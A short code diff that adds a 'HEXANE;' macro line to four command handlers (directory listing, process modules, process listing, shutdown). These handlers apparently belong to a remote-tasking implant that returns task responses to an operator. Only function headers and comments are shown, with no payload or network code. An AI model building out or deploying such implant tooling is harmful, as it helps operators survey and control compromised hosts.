@@ -17,6 +17,7 @@ namespace Commands {
     };
 
     VOID DirectoryList (_parser *const parser) {
+        HEXANE;
 
         _stream *out = CreateTaskResponse(DIRECTORYLIST);
 
@@ -94,6 +95,7 @@ namespace Commands {
     }
 
     VOID ProcessModules (_parser *const parser) {
+        HEXANE;
 
         _stream *out = CreateTaskResponse(PROCESSMODULES);
 
@@ -141,6 +143,7 @@ namespace Commands {
     }
 
     VOID ProcessList() {
+        HEXANE;
 
         _stream *out = CreateTaskResponse(PROCESSLIST);
 
@@ -234,6 +237,7 @@ namespace Commands {
     }
 
     VOID Shutdown (_parser *parser) {
+        HEXANE;
 
         // Send final message
         // Zero/Free all memory
